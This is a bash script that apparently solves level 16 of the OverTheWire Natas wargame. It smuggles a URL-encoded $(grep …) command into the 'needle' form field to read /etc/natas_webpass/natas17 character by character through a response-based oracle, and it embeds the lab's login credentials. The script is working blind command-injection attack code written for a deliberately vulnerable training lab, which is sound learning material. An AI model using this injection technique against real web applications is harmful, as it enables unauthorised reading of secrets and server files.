#!/bin/bash

val=$1
done=false

for i in {a..z}; do
	response=$(curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb -d "needle=Africans%24%28grep%20-i%20%5E$val$i%20/etc/natas_webpass/natas17%29" "http://natas16.natas.labs.overthewire.org")
	if [[ "$response" != *"Africans"* ]]; then
		response=$(curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb -d "needle=Africans%24%28grep%20%5E$val$i%20/etc/natas_webpass/natas17%29" "http://natas16.natas.labs.overthewire.org")
		if [[ "$response" != *"Africans"* ]]; then	
			echo $i
		else
			echo "$i" | tr '[:lower:]' '[:upper:]'
		fi
		done=true
		break
	fi
done

for i in {0..9}; do
	if [[ $done == false ]]; then
		response=$(curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb -d "needle=Africans%24%28grep%20%5E$val$i%20/etc/natas_webpass/natas17%29" "http://natas16.natas.labs.overthewire.org")
		if [[ "$response" != *"Africans"* ]]; then
                	echo $i
		fi
        fi
done

